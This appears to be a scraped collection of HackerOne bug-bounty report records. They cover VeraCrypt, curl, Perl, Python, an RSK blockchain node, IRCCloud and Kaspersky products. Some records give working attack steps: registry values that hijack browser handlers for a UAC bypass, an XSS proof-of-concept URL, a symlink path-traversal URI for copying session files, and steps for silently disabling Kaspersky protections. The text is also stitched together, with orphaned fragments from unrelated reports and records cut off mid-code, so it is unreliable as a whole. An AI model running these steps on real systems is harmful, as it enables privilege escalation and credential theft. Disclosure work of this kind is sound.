All the process took ~1 month, and was handled in embargo mode and in private as far as possible. We are now reaching the proposed deadline for full public disclosure (16/06) with no pending blockers by software authors and AS.
Research reports
Once the embargo is over we would like to produce more detailed reports on what we found during the study, as such we are submitting an academic paper to WOOT'14 and a talk at DEFCON'14. Both are current under embargo and pending review, but we can attach them, if requested, under an informal non-disclosure agreement.

Internet Bug Bounty,1-10,1.0,No value,"$1,250.00",Medium,5.45,Privilege Escalation,Local Privilege Escalation during execution of VeraCryptExpander.exe (UAC bypass),"penrose  submitted a report to Internet Bug Bounty.Apr 6th (4 years ago)Summary:
Your VeraCryptExpander.exe is vulnerable to a Local Privilege Escalation (UAC BYPASS) during execution. The issue is located here:
https://github.com/veracrypt/VeraCrypt/blob/a108db7c85248a3b61d0c89c086922332249f518/src/ExpandVolume/VeraCryptExpander.manifest
https://github.com/veracrypt/VeraCrypt/blob/a108db7c85248a3b61d0c89c086922332249f518/src/ExpandVolume/WinMain.cpp
The issue is detected on the fact that you launch a web page  through an elevated process but trust the link to be opened by an app specified by registry keys belonging to HKCU Hive (current user domain) and not an elevated HIVE set like HKEY_LOCAL_MACHINE. It is possible for an attacker that has limited admin privileges (not full admin with UAC) to hijack the execution of you code by tampering specific registry keys linked to browsers and elevate his privileges ultimately tampering your installation folder by writing malicious code in it or replacing binaries with his own.
A file less malware that has hijacked the reghive altering or creating specific keys can hijack the execution of you binary and bypass UAC achieving full admin right.
Examples of malware using UAC bypass: https://attack.mitre.org/techniques/T1088/
The attack was successfully tested in both WIN 7 and WIN 10
Steps To Reproduce:
Windows OS 7 (tested) for this example
Default browser Chrome (works with any default browser option just change the right reg)
User role ADMINISTRATOR - name of my user for the example is: TEMP
Step0. Create malicious script to elevate: malstaller.bat on desktop (attached)
Step1. Tamper Registry Keys - run add.bat attached after altering the current username
This action simulates an attacker (with low privilege admin) tampering the content of the following registry keys (no need for full admin rights). These keys are tampered to cover all cases of popular default browsers:
[HKEY_CURRENT_USER\Software\Classes\ChromeHTML\shell\open\command]
@=""C:\Users\Temp\Desktop\malstaller.bat \""%1\""""
[HKEY_CURRENT_USER\Software\Classes\ChromeURL\shell\open\command]
@=""C:\Users\Temp\Desktop\malstaller.bat \""%1\""""
[HKEY_CURRENT_USER\Software\Classes\FirefoxHTML\shell\open\command]
@=""C:\Users\Temp\Desktop\malstaller.bat \""%1\""""
[HKEY_CURRENT_USER\Software\Classes\FirefoxURL\shell\open\command]
@=""C:\Users\Temp\Desktop\malstaller.bat \""%1\""""
[HKEY_CURRENT_USER\Software\Classes\IE.HTTP\shell\open\command]
@=""C:\Users\Temp\Desktop\malstaller.bat \""%1\""""
[HKEY_CURRENT_USER\Software\Classes\IE.HTTPS\shell\open\command]
@=""C:\Users\Temp\Desktop\malstaller.bat \""%1\""""
[HKEY_CURRENT_USER\Software\Classes\HTTP\shell\open\command]
@=""C:\Users\Temp\Desktop\malstaller.bat \""%1\""""
[HKEY_CURRENT_USER\Software\Classes\HTTPS\shell\open\command]
@=""C:\Users\Temp\Desktop\malstaller.bat \""%1\""""
The path is altered to point to the malicious script that attacker wants to be elevated (UAC bypass attack/privilege escalation). This script can do anything like deleting/creating files under C:. Scheduling tasks etc.
Step2. To achieve/activate UAC bypass
Run VeraCryptExpander.exe and click on the button : ""Homepage"" on the higher top part of the window.
The execution in now hijacked (see video) and UAC bypass is achieved.
A one liner used in the video will place fake VeraCrypt2.exe (with putty.exe as PoC) under your installation folder and execute it with full admin priviledges.
Useful files of your installation can be tampered alternatively and used as backdoor.
Watch the video attached were a simple .bat script gains elevated admin privileges during your software execution and writes in admin space.
WINDOWS 10
User Role: Administrator
In order to successfully replicate the attack on Windows 10 the following steps must be followed (a little bit different from WIN 7) . As windows have changed some security setting you cannot alter the default browser for the attack to happen seamlessly. But win 10 users are still vulnerable. The difference is that after tampering reg keys to trap various browsers (not the current default) on the system in the affected system the victim must change the default browser to one that has been trapped for the exploit to happen.
In the example below on WIN 10 and with Default Browser assuming EDGE, we will trap IE. If after we alter reg keys executing the add.bat, the user chooses IE or any other browser in place as his default browser the exploit works as before.
Be Admin user logged in!
Step 1: Tamper or create registry keys for IE (or run add.bat) no UAC is needed to do so (your default browser is EDGE):
[HKEY_CURRENT_USER\Software\IE.HTTP\shell\open\command][HKEY_CURRENT_USER\Software\IE.HTTPS\shell\open\command]
With value:
""C:\Users{PLACE PROPER USER ACCOUNT NAME HERE}\Desktop\malstaller.bat"" ""%1""
Step 2: After step 1 is done and only then admin user chooses to set IE as default browser (your default browser is IE but in reality user has set our malicious script as default browser!!!).
Step3: Execute your vulnerable  software that triggers the execution of the malicious code with elevated privileges as before. click button ""Homepage"" 
Note:
If the tampered keys are already set for ex. IE (booby-trap set) and for some reason the admin users chooses to change default browser from ex. Edge to IE (booby-trapped) then the attack works smoothly.
Both add.bat and malstaller.bat need changes in the username and relative paths to work for you.
Fix:Remove any link/button to external web resources on elevated processes.
In CPP while inside an elevated process (UAC accepted), use:
void safeCall()
{
system(""explorer http://www.test.com"");
}
Instead of:
void unsafeCall()
{
ShellExecute(0, 0, L""http://www.test.com"", 0, 0, SW_SHOW);
}
The safeCall() will trigger a new process to open the URL with less privileges, keeping you safe from the attack. Stupid workaround but it works if you need to keep the link.
Impact
It is possible for an attacker that has limited admin privileges (not full admin with UAC) to hijack the execution of you code by tampering specific registry keys linked to browsers and elevate his privileges ultimately tampering your installation folder by writing malicious code in it or replacing binaries with his own. The installation of your software can be fully compromised.3 attachments:F463638: Trigger.JPGF463641: malstaller.zipF463642: Poc.mp4",https://hackerone.com/reports/530292,No value,No value,No value,2019,4,6,18,48

Internet Bug Bounty,1-10,1.0,No value,$500.00,Medium,6.5,Server-Side Request Forgery (SSRF),cURL / libcURL - CVE-2016-8624 invalid URL parsing with '#',"fms  submitted a report to Internet Bug Bounty.Nov 5th (6 years ago)invalid URL parsing with '#'
Project cURL Security Advisory, November 2, 2016 -
[Permalink] https://curl.haxx.se/docs/adv_20161102J.html
VULNERABILITY
curl doesn't parse the authority component of the URL correctly when the host
name part ends with a '#' character, and could instead be tricked into
connecting to a different host. This may have security implications if you for
example use a URL parser that follows the RFC to check for allowed domains
before using curl to request them.
Passing in http://example.com#@evil.com/x.txt would wrongly make curl send a
request to evil.com while your browser would connect to example.com given the
same URL.
The problem exists for most protocol schemes.
We are not aware of any exploit of this flaw.
INFO
The Common Vulnerabilities and Exposures (CVE) project has assigned the name
CVE-2016-8624 to this issue.
AFFECTED VERSIONS
This flaw exists in the following curl versions.

Affected versions: curl 7.1 to and including 7.50.3
Not affected versions: curl >= 7.51.0

libcurl is used by many applications, but not always advertised as such!
THE SOLUTION
In version 7.51.0, the parser function is fixed.
A patch for CVE-2016-8624 is
available.
RECOMMENDATIONS
We suggest you take one of the following actions immediately, in order of
preference:
 A - Upgrade curl and libcurl to version 7.51.0
 B - Apply the patch to your version and rebuild
 C - Strip out the parts of the URLs containing '#' before passing them to curl
TIME LINE
It was first reported to the curl project on October 10 by Fernando Muñoz.
We contacted distros@openwall on October 19.
curl 7.51.0 was released on November 2 2016, coordinated with the publication
of this advisory.

This vulnerability can be exploited in two ways. The first is to produce a .pcap file with crafted packet(s) for the protocol(s) concerned and make the target system try to decode the file using tcpdump. The second is to send specially crafted packet(s) to the network segment where the target system is running a tcpdump process that is decoding a live packet capture. In the latter case it depends on the specific network protocol if the crafted packet(s) may be sent from the local segment only or from a remote Internet host.
Impact
If the affected program is running with special privileges, or accepts data from untrusted network hosts (e.g. a webserver) then the bug is a potential security vulnerability. If the heap buffer is filled with data supplied from an untrusted user then that user can corrupt the memory in such a way as to inject executable code into the running program and take control of the process.

 There is an out-of-bounds write that is likely exploitable while performing Huffman decoding of Fax images.

 Basic initialization; of specific note are that the variables 'x' and 'count' are signed. On a 64-bit
platform, assuming GCC or similar, it is 8 bytes in length and of course 4 bytes in length on 32-bit. There
is nothing inherently restricting this to 32-bit other than practicalities of the file size as there is a
need to have backing data to trigger the vulnerability. On 64-bit platforms this equates to a file size that
exceeds the default maximums, whereas on 32-bit the attached Proof-of-Concept out-of-bounds write trigger
only requires a file of a few megabytes-- which to my understanding can be reduced by wrapping the file in
compression.
 Additionally, the Huffman hash tables have code lengths that range between 0 and 2560.

 In the above code, we enter an unbounded for() loop at line 501, which terminates upon file EOF or other
abnormal condition. lines 513-531 unpack a huffman encoded pixel one bit at a time. Once the first binary 1
is encountered, the loop will always terminate until the total length of the code exceeds 13 or a
corresponding entry in the huffman tables are found at lines 548 or 554.
 In other words, we unpack the pixels and look them up in the huffman tables. Once we encounter a one, we
terminate the loop and attempt to look up the symbol in the corresponding tables matching the symbol length
and the symbol code. If we don't find a match, then we restart the loop and unpack another bit. This
continues until a symbol is found or a sequence of 11 or more zeros or 13 or more bits is encountered.

 When a symbol is found, we enter a jump table dependant upon the symbol type. The crux of the problem exists
in this section. The bounds check at line 566: ""if ((x+count) > (long) image->columns)"" is insufficient due
to the variables being signed, thus it becomes possible to:
1 Iterate across TWId or TBId symbols incrementing the value of x such that x is non-zero but less than
image->columns
2 Provide repeated instance of MWid, MBId or EXId symbols to iteratively work the ""count"" variable into a
value close to but not exceeding INT_MAX
3 Provide another TWId or TBId symbol causing an additive overflow at line 566.
4 Depending upon the state of the variable 'color', this will either result in:
⋅⋅4 The x variable becoming negative yielding an invalid offset at line 577; or
⋅⋅4 Resulting in an invalid value of count which exceeds the image->columns and thus bounding of scanline,
resulting in an out-of-bounds write at lines 577 and 578

Proof-of-Concept:
 Attached is a simple C++ program that when build (make; assuming g++ is in your path) and run will output a
file 'poc.fax' that can then be supplied to any code path that causes
ReadImage()->ReadFAXImage()->HuffmanDecodeImage() to be executed. It works the 'x' variable up to a value of
64, then the count variable up to INT_MAX - 64, then provides one of the symbols with a count length of 0 to
make x negative and then fetches a symbol that results in the out-of-bounds write.
Vendor Response
Justin,
This problem (and a number of other issues observed in compress.c) are
addressed by Mercurial changeset 16131:95abc2b694ce.
Thank you very much for your detailed report.

Impact
Exploitability:
 At first blush, this appears to be a wild out-of-bounds write with relatively little control. However, the
check at line 568 allows us a finer grained control over circumstances. Notably, it becomes possible to skip
over uncontrolled writes and toggle the color variable, the user can then supply additional MWId, MBId or
EXId symbols, causing the value of count to become non-negative, which in tandem with the color toggle
allows arbitrary modification of the x variable which in turn allows for a finer controlled write. The only
bounding is the maximum file size to be processed with each iteration taking approximately 1.3 megabytes of
huffman codes which can be compressed and should compress down nicely.
 In other words, you can set the value of x, then increment count into a negative value and toggle the color
variable back then increment count until its value is sane/positive again, and then re-enter the TWId/TBId
section thereby modifying the x variable again, then increment count into a negative and toggle color again
and overall repeat. This would ultimately allow writes as fine grained as a single byte immediately after or
immediately before the scanline buffer and within a certain range outside of that bounding. As this is heap
memory, it is thought to readily lend itself to exploitability.
 Finally, because this would allow for the modification of heap metadata, e.g. block sizes and similar,
because both the encoded and decoded data is user controlled without any real constraints and because all
code paths will trigger a free condition, exploitibility seems more a matter of academic interest than a
legitimate question.
 The specifics of this can be begrudingly worked out if required.1 attachment:F744093: fax_poc.tar.gz",https://hackerone.com/reports/816637,No value,No value,No value,2020,3,11,10,27

This would allow for messages up to 16Mb in length. Messages of this length are
excessive and OpenSSL includes a check to ensure that a peer is sending
reasonably sized messages in order to avoid too much memory being consumed to
service a connection. A flaw in the logic of version 1.1.0 means that memory for
the message is allocated too early, prior to the excessive message length
check. Due to way memory is allocated in OpenSSL this could mean an attacker
could force up to 21Mb to be allocated to service a connection. This could lead
to a Denial of Service through memory exhaustion. However, the excessive message
length check still takes place, and this would cause the connection to
immediately fail. Assuming that the application calls SSL_free() on the failed
conneciton in a timely manner then the 21Mb of allocated memory will then be
immediately freed again. Therefore the excessive memory allocation will be
transitory in nature. This then means that there is only a security impact if:
1) The application does not call SSL_free() in a timely manner in the
event that the connection fails
or
2) The application is working in a constrained environment where there
is very little free memory
or
3) The attacker initiates multiple connection attempts such that there
are multiple connections in a state where memory has been allocated for
the connection; SSL_free() has not yet been called; and there is
insufficient memory to service the multiple requests.
Except in the instance of (1) above any Denial Of Service is likely to
be transitory because as soon as the connection fails the memory is
subsequently freed again in the SSL_free() call. However there is an
increased risk during this period of application crashes due to the lack
of memory - which would then mean a more serious Denial of Service.
This issue does not affect DTLS users.

Impact
This returned negative output length, which, when combined with common use of pointer arithmetic in buffers results in accessing incorrect regions of memory (typically this would manifest as a segfault due to the size of the negative value, but that is not guaranteed).",https://hackerone.com/reports/1113025,No value,No value,No value,2021,2,27,21,14

Internet Bug Bounty,1-10,1.0,No value,"$1,000.00",Critical,9.8,Integer Overflow,Integer overflow leading to buffer overflow,"jkrshnmenon  submitted a report to Internet Bug Bounty.Oct 15th (4 years ago)There exists an integer overflow in Perl_my_setenv @ util.c : 2070
2070: void Perlmy_setenv(pTHX const char nam, const char val) {
...
2166:         const int nlen = strlen(nam);
...
2171:         vlen = strlen(val);
2172:         new_env = (char)safesysmalloc((nlen + vlen + 2)  sizeof(char));
Here in a 64 bit version of Perl, since the arguments nam and val are user controlled, the 32 bit integers nlen and vlen are also under the control of the attacker. Therefore, if nam and val are two very long strings (for example, 2147483647 bytes long), the addition at line 2172 would result in an integer overflow.
The new_env would therefore be a chunk of a size which is smaller than the sum of the lengths of the two input strings.
This new_env is subsequently used in a call to memcpy to copy nlen bytes from nam followed by vlen bytes from val.
This results in a buffer overflow on the heap with attacker controlled input.
Please find attached a PoC which demonstrates the buffer overflow. Please note that the attached PoC consumes large amounts of memory and results in a segmentation fault on a 64 bit Ubuntu 16.04 system running a 64 bit version of perl.
This segmentation fault occurs due to the fact that the memcpy tries to write outside the initial heap boundary.
This vulnerability has been recognised as a serious security issue and has been assigned the identifier CVE-2018-18311 by the developers.

Internet Bug Bounty,1-10,1.0,No value,"$1,000.00",Medium,5.45,Memory Corruption - Generic,chain.__setstate__ Type Confusion,"johnleitch  submitted a report to Internet Bug Bounty.Oct 11th (6 years ago)Python 3.5.2 suffers from a type confusion vulnerability in the chain.setstate method of the itertools module. The issue exists due to lack of argument validation in the chain_setstate() function:
    static PyObject 
chain_setstate(chainobject lz, PyObject state)
{
PyObject source, *active=NULL;
        if (! PyArg_ParseTuple(state, ""O|O"", &source, &active))

Py_XSETREF(lz->source, source);
Py_XINCREF(active);
Py_XSETREF(lz->active, active);
Py_RETURN_NONE;
}
After parsing the argument tuple, source and active are set without validating that they are iterator objects. This causes issues elsewhere, where the values are passed PyIter_Next:
    static PyObject 
chain_next(chainobject lz)
{
PyObject *item;
        if (lz->source == NULL)
return NULL;                                    / already stopped /

This means the kernel 5.8. stable branch was affected by the vulnerability. I wrote a highly reliable LPE exploit for Fedora 33, which used the 5.8. kernel. Next, week, on october 22nd Ubuntu 22.10 is released which would have been vulnerable as well if I had not reported the vulnerability. Effectively, all distributions could have become affected.

IOVLabs,11-50,0.0,10m-50m,"$10,000.00",Critical,9.3,Deserialization of Untrusted Data,Attacker can add arbitrary data to the blockchain without paying gas,"ahook  submitted a report to IOVLabs.Aug 19th (4 years ago)Summary:
Due to a missing sanity check in Transaction::rlpParse, an attacker can append arbitrary RLP-encoded data to the end of an otherwise valid transaction, and that data will not only pass through validation, but also be propagated throug the network and mined into a block. Since the block parser uses the same code for decoding transactions (as it should), the block will also be conidered valid.
Description:
The issue stems from the Transaction::rlpParse function:
https://github.com/rsksmart/rskj/blob/master/rskj-core/src/main/java/org/ethereum/core/Transaction.java#L242
Once all the relevant data is pulled from the decoded RLP, there are no checks to ensure that we've reached the end of the data.
Since the transaction is constructed using the raw encoded bytes, any future calls to getEncoded() will return the entire byte array, including the bad data at the end. Signature verification of the valid transaction will still pass because it uses getRawEncoded() to compute the signature, which ignores the extra data.
Steps To Reproduce:
On a remote server I start up a regtest node from a clean codebase. This will begin mining as a single-node network:
Code 123 BytesWrap lines Copy Download1remote:~/rskj$ java -Dblockchain.config.name=regtest -cp rskj-core/build/libs/rskj-core-0.5.0-SNAPSHOT-all.jar co.rsk.Start
On my local machine, I start another regtest node but I modify the config to a) talk to my remote node, and b) not mine. I don't mine on this node because I will be using it to manufacture beefy transactions and I want to make sure that other, clean nodes will accept/mine these transactions.
In addition to the config changes, I have also modified the eth_sendTransaction code to add extra rlp-encoded bytes to the end of the transaction. In order to easily see the data in a hex blob, I'm just setting it to a repeated 0xbeef string. I've also hacked the getBlockByHash function to return the full encoded hex block in the extraData field, as a quick way to query and see the raw block data.

Sorry for the giant data dump there, but if you take a look at the extraData in the returned block (which is actually the full block hex because of the hacked code), you can see that the ""beefbeefbeefbeef"" data made it in.
This is a proof that a malicious node (my local node) can craft a transaction with extra data appended, share that transaction with the network via the normal p2p process, and have the extra data mined into a block.
Here's the full diff for the attacker/local node. Sorry again, it's a little hacky. I could have used the eth_sendRawTransaction endpoint, but I didn't want to go through the process of hand-constructing the rlp-encoded data:

Impact
The attacker can add arbitrary data into the blockchain without paying the requisite gas or undergoing any validation of the extra data.
I can think of three ways to get this data into the system: 1) the method I detailed in the above PoC, in which the attacker creates a valid transaction and adds the data, 2) a malicious miner could just add the data to any valid transaction it has in its pool; 3) an attacker could wait for new pending transactions to appear, then add their data and send the tx back to the network. If the attacker's version of the tx makes it to the miner that produces the next block, the data will make it to the chain without the attacker even needing to create their own valid tx.
I have not checked to see how much data can be appended, but I assume its limited only by whatever overall block/transaction/message size constraints exist.",https://hackerone.com/reports/396954,Buenos Aires,Argentina,Buenos Aires,2018,8,19,6,5

It's dangerous because user doesn't see real URL. Attacker can open anything and specify any title (like ""IRCCloud: Login Required""), and using that trick steal user credentials.

It works so:
1) I start your activity with the following uri: file:///data/data/com.attacker/x/x/x/x/..%2F..%2F..%2F..%2Fsdcard%2Fprefs.xml
2) Canonical file from #2 (/data/data/com.attacker/sdcard/prefs.xml) is a symlink file pointing to the file I want to theft (/data/data/com.irccloud.android/shared_prefs/prefs.xml)
3) In your app original_filename is equal to ../../../../sdcard/prefs.xml
4) 
Code 121 BytesWrap lines Copy Download1InputStream is = IRCCloudApplication.getInstance().getApplicationContext().getContentResolver().openInputStream(fileUri);
But openInputStream(...) automatically decodes the specified uri. So it will access my symlink file which points to /data/data/com.irccloud.android/shared_prefs/prefs.xml
5) 
Code 195 BytesWrap lines Copy Download1Uri out = Uri.fromFile(new File(context.getCacheDir(), original_filename));
2OutputStream os = IRCCloudApplication.getInstance().getApplicationContext().getContentResolver().openOutputStream(out);
It is equal to 
Code 107 BytesWrap lines Copy Download1Uri out = Uri.fromFile(new File(""/data/data/com.irccloud.android/cache/"", ""../../../../sdcard/prefs.xml""));
So it simply outputs the specified file to Sd card.
How to fix#
Just specify e.g. current timestamp as a file name, but don't use provided by attacker. In current implementation attacker can force IRC Cloud app to copy arbitrary files to arbitrary directories. File /data/data/com.irccloud.android/shared_prefs/prefs.xml contains session_key. In normal situation this file is accessible only to IRC Cloud app. But when it's copied to e.g. Sd card it will be accessible to everyone. But Sd card is only simple example. Attacker can also force IRC Cloud app to copy a file to its internal directory.
BTW this vulnerability also allows to overwrite arbitrary files. So attacker also can replace any your protected files and substitute for example history.2 attachments:F238128: Screenshot_2017-11-09-23-21-29.pngF238129: Screenshot_2017-11-09-23-21-21.pngbagipro   posted a comment. Nov 10th (5 years ago)Forgot to attach PoC APK in the previous message1 attachment:F238346: app-release.apkjwheare IRCCloud staff  changed the status to Triaged. Nov 10th (5 years ago)Thanks for the report.

This check (and similar too) does nothing, because it should get canonical path, but no absolute. It can be bypassed like so:
Code 34 BytesWrap lines Copy Download1/data/data/./com.irccloud.android/
(and even if you change to canonical path, it can be bypassed via symlinks)

Here we see that method ImageList.fetchImageInfo(..) is being loaded with attacker provided data.
Inside ImageList:

So both info.thumbnail and info.original_url contains attacker provided data and this stuff is returned back to ImageViewerActivity where code is executed

Inside this method attacker can inject arbitrary HTML/JS:

IRCCloud,11-50,0.0,under-1m,$100.00,No value,0.0,Improper Authentication - Generic,Bug in iOS application which could lead to unauthorised access.,"uname  submitted a report to IRCCloud.Apr 11th (9 years ago)Hi,
The file under the Preferences folder within the iOS application stores sensitive information: com.irccloud.IRCCloud.plist. This file stores the user's authenticated session identifier. Stealing this information would allow unauthorised access to a user's account.
The content of the file can be seen in the file attached to this report.
This file is accessible from the phone even while the phone is locked with a passcode suggesting that the application does not secure the file using the appropriate data protection class.
This can also be verified by using the tool available at the following link:
https://github.com/ciso/ios-dataprotection/
If a user is logged into the application, all that an attacker needs to do is surreptitiously take the phone and dump the file within the folder. This would work while the phone is locked and does not require the phone to be jailbroken.
I should also mention that I haven't looked through all the files, but any sensitive file with the Protection class set to anything other than NSFileProtectionComplete would be extractable from the iPhone without requiring the passcode.
If you would like to test this, you can use the ios-data protection tool mentioned above or extract the data with iExplorer (Demo version) while the phone is locked and the user logged in.

IRCCloud is affected by Cross Site Scripting vulnerability in its badges page. (www.irccloud.com/badges)
II. Description
IRCCloud is open to parameter pollution attacks ie. a parameter passed more than once with different values results in varying different results.
This bug is used to leverage an XSS in the badges page.
POC link:
Code 109 BytesWrap lines Copy Download1www.irccloud.com/badges?hostname=hostname"" type=""text/javascript""> /*&hostname=*/alert('XSS\n-Rohit Dua'); //
If  you visit the link a javascript pops up showing the message 'XSS - Rohit Dua'. (screenshot_irccloud.png)
Even after parameter pollution, the attack is ineffective due to strong XSS filters(possibly firewall)
The filter evasion is possible due a certain combination of javascript comments in the url that combine and comment out the unneeded part.

During my reconnaissance for your bug bounty program, I discovered an instance of nginx version 1.4.6 running at the IP address https://54.153.101.52. To locate it, I search for IRCCloud-related certificated and found the self-signed certificate for this server (https://censys.io/ipv4/54.153.101.52). This version is in the range of nginx versions affected by the CVE, CVE-2014-0133. There is a known exploit for this CVE. According to MITRE, this ""heap-based buffer overflow in the SPDY implementation in nginx 1.3.15 before 1.4.7 and 1.5.x before 1.5.12 allows remote attackers to execute arbitrary code via a crafted request.""
Image F120380: Screenshot_2016-09-15_00.01.28.png 34.16 KiBZoom in Zoom out Copy Download
However, to succeed, I believe that the exploit requires the ngx_http_spdy_module module (which is not compiled by default) and it requires no --with-debug configure option, if the ""spdy"" option of the ""listen"" directive is used in a configuration file. Because I am unable to check the configuration of your server, I wanted to inform you of this outdated version.
Checking for Vulnerability Steps

Log into server located at 54.153.101.52
Check the nginx configuration file. This should provide you with information as to whether or not it is vulnerable.

Mitigation
Regardless, this is a very outdated version of nginx that should likely be updated to the most recent version if you intend to keep if publicly-exposed. This would correct the vulnerability (if it is vulnerable). Alternatively, if you only want to correct the vulnerability, you can use the patch below:

IRCCloud,11-50,0.0,under-1m,$100.00,No value,0.0,Violation of Secure Design Principles,Host Header Injection - irccloud.com,"ethicalhacker  submitted a report to IRCCloud.May 25th (8 years ago)Host Header Injection Attack - irccloud.com
An attacker can manipulate the Host header as seen by the web application and cause the application to behave in unexpected ways.
Very often multiple websites are hosted on the same IP address. This is where the Host Header comes in. This header specifies which website should process the HTTP request. The web server uses the value of this header to dispatch the request to the specified website. Each website hosted on the same IP address is called a virtual host.
But what happens if we specify an invalid Host Header? If Apache receives an unrecognized Host Header, it passes it to the first virtual host defined in httpd.conf. Therefore, it's possible to send requests with arbitrary Host Headers to the first virtual host. 
Another way to pass arbitrary Host headers is to use the X-Forwarded-Host Header. In some configurations this header will rewrite the value of the Host header. Therefore it's possible to make a request like:

The above links mention 2 different ways to exploit this issue:

web-cache poisoning and/or 
Using alternate channels like password reset emails. 

For the first way, it can be exploited by poisoning a cache with the attacker's domain and then serving that poisoned response to legitimate users, causing them to redirect to the attacker's domain. This attack kind of varies depending on different web servers as they interpret duplicate Host headers in different ways. The attack vectors are very well explained in the above blogs so I don't want to re-iterate them here again. 
For the second way, I verified that the password reset functionality on the IRC Cloud website does not retrieve the Host header when sending emails. But, validating the Host header is always a good practice. 1 attachment:F6325: Screen_Shot_2014-04-12_at_12.40.02_PM.png",https://hackerone.com/reports/7357,England,United Kingdom,London,2014,4,12,16,54
IRCCloud,11-50,0.0,under-1m,$200.00,High,7.95,Insecure Direct Object Reference (IDOR),IDOR with Geolocation data not stripped from images,"do_some_hack  submitted a report to IRCCloud.Jun 24th (2 years ago)Vulnerable URL :-   https://usercontent.irccloud-cdn.com/file/0wXMTrPu/hgjbk
Vulnerability Discription:
When an image is taken using a smartphone or camera certain metadata fields are often attached to it. These fields could include the model of the camera, the time it was taken, whether the flash was used, the shutter speed, focal length, light value and even the location. In Inturn, while uploading the image as a profile picture, the exif data is not stripped from images. The exif data in images contains sensitive data like Geoloacation, latitude, longitude, etc. Also it contains the camera information and other details. 
And your website vulnerable to image IDOR which allows attacker to see other users images and retrive data using tool.
Tools Used: exiftool.
Steps TO reproduce:
Use  2 accounts in two browser
Download images from here 
https://github.com/ianare/exif-samples/tree/master/jpg/gps
1)In 1st account in network user can upload files just upload the image their and open image link in new tab.
 new tab that image url like
https://usercontent.irccloud-cdn.com/file/0wXMTrPu/hgjbk
2)In second account do same things and that url like down 
https://usercontent.irccloud-cdn.com/file/ZUsZU7az/3.jpg
3) Change 1st account Url parameter value to 2nd acoount Url parameter(see poc for it).
4) now image will shows up copy that url again and paste it to image data retrival website
http://exif.regex.info/exif.cgi
5) and see sensitive data   exposed.
Impact
1) By this the attacker tracks your location and use it for personal things.
2) Sensitive data exposed.1 attachment:F881191: 2020-06-24_08-17-01.mkv",https://hackerone.com/reports/906907,England,United Kingdom,London,2020,6,24,15,26

The program description doesn't reflect this however.
Summary
It is possible for websites to read out addresses that the user stores in Kaspersky Password Manager.
Description
Kaspersky Password Manager injects its user interface into untrusted web pages, there are no protections in place. This makes it easy for websites to instrument the user interface, e.g. to fill in addresses without the user's consent or knowledge.
Environment

Scope: Application
Product name: Kaspersky Password Manager, browser extensions installed
Product version: 9.0.1.447
OS name and version (incl SP): Windows 10 Version 1803
Attack type: Information Disclosure
Maximum user privileges needed to reproduce your issue: no privileges

Steps to reproduce

Make sure to unlock Kaspersky Password Manager and to add an address. The actual address part should be a single line (filling in fails for multiline values with my PoC which could certainly be addressed if necessary).
Download the attached extract_address.html and open it via any web server (localhost will do).
Go to http://.../extract_address.html with your browser (I tried Firefox 62 but this should work in Chrome as well) and wait a few seconds.

An alert message will pop up telling your name and address. This information could be sent to a third party without you noticing anything.
Impact
This allows to deanonymize and to track users, the address being a particularly valuable piece of information. Privacy conscious users will still be recognized reliably, even if clearing cookies and using proxy servers. In addition, advertisers will certainly love the possibility of telling exactly where the person lives - makes for some great targeting.",https://hackerone.com/reports/430854,Moscow,Russia,Moscow,2018,10,30,13,30

Kaspersky,1001-5000,0.0,200m-1b,"$2,500.00",Medium,5.45,Insecure Direct Object Reference (IDOR),Web protection component in Anti-Virus products family uses predictable links for certificate warnings,"palant  submitted a report to Kaspersky.Dec 18th (4 years ago)Summary
Websites can predict links used in certificate warnings, Safe Money prompts, anti-phishing warnings and similar pages. This allows them to initiate actions without the user's knowledge.
Description
The links used to override certificate warnings have the following format: https://<host>/?<link_id>_kis_cup_<GUID>_. Here, GUID is identical for all certificate warnings and link_id is a value that is being counted up continuously. So if a website can get hold of one such link, it can predict what future links will look like. This allows triggering actions on behalf of the user, e.g. overriding the wrong certificate for another website. Similarly, websites can permanently disable Safe Money protection for a banking website, the prompt there uses the same link format and the same link_id counter. And while an anti-phishing warning is overridden with http://touch.kaspersky.com/kis_cup_<GUID>_<link_id> it's once again the same values, so triggering this action automatically is possible as well.
The easiest way for a website to get hold of a valid link appears to be downloading its own certificate warning. Since certificate warnings are first-party as far as the website is concerned, it has complete access to them. The server needs to serve a valid certificate first so that the website can load, then switch to an invalid certificate so that any request will result in a certificate warning page from Kaspersky. The website can then download this warning page and read out the links from it.
Environment

Scope: Application
Product name: Kaspersky Internet Security
Product version: example: 19.0.0.1088
OS name and version (incl SP): Windows 10.0.17134
Attack type: Insecure Direct Object Reference
Maximum user privileges needed to reproduce your issue: no privileges

Steps to reproduce
Multiple steps to reproduce here to demonstrate various attacks possible, all tested in Firefox 64. First overriding a certificate:

Edit the file %WINDIR%\sysnative\drivers\etc\hosts as administrator and add the following line: 93.184.216.34 www.google.com (that's the IP address of example.com to simulate a MitM attack).
Go to https://www.google.com/ in your browser - note how Kaspersky will display a certificate warning page.
Now download the attached rebinding_server.py and certerror_override.html to some directory on your computer and run rebinding_server.py (Python 3 required). This will run an HTTPS server on https://localhost:5000/, with an additional server on http://localhost:5001/ that will make the primary server alternate between the first (supposedly valid) and second (invalid) SSL certificate.
Open https://localhost:5000/certerror_override.html in your browser (override the certificate warning, real attackers would use a website with a valid certificate).
The page masquerades as a warning from Kaspersky about your network not being protected, which is probably true if the attackers managed MiTM www.google.com and show you this page. Click the ""I understand the risks and wish to continue"" link. 
An additional warning by Kaspersky opens saying: ""You are about to go to an insecure web resource. Are you sure you want to continue?"" That warning is in line with what you already saw, so you click ""Continue.""
You will be redirected to https://www.google.com/ - the MiTM attack succeeded. The page says ""Not Found,"" the certificate warning is gone.

Now disabling Safe Money functionality:

Make sure that Safe Money functionality is enabled in Kaspersky settings and set to ""Prompt for action"" on first access (the default value).
Go to https://www.bankofamerica.com/ in your browser - note how Kaspersky will ask you whether you want to open this page in a safe browser.
Now download the attached rebinding_server.py and disable_safemoney.html to some directory on your computer and run rebinding_server.py (Python 3 required). This will run an HTTPS server on https://localhost:5000/, with an additional server on http://localhost:5001/ that will make the primary server alternate between the first (supposedly valid) and second (invalid) SSL certificate.
Open https://localhost:5000/disable_safemoney.html in your browser (override the certificate warning, real attackers would use a website with a valid certificate).
Note how you are being redirected to https://www.bankofamerica.com/ without any further warning, Safe Money functionality has been permanently disabled for this site. An actual attack might prefer to disable the functionality temporarily however, as this wouldn't leave any traces.

And overriding anti-phishing prompts:

Go to https://www.amtso.org/check-desktop-phishing-page/ in your browser - note how Kaspersky will prevent you from going there, indicating that it is a phishing page.
